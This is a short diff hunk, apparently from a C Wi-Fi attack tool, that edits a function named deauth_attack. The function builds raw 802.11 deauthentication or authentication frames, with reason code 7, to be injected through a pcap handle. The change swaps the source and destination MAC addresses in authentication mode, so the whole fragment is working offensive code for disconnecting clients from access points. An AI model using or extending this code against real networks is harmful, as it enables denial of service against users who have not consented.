@@ -27,8 +27,8 @@ void deauth_attack(pcap_t *handle, Mac ap_mac, Mac station_mac, bool auth)
     dP.beacon.type = auth ? 0xb0 : 0xc0;
     dP.beacon.flags = 0;
     dP.beacon.duration = 0;
-    dP.beacon.dest = station_mac;
-    dP.beacon.src = ap_mac;
+    dP.beacon.dest = auth? ap_mac : station_mac;
+    dP.beacon.src = auth? station_mac : ap_mac;
     dP.beacon.bssid = ap_mac;
     dP.beacon.seq = 0;
     dP.reasonCode = 0x0007; // Class 3 frame received from nonassociated STA
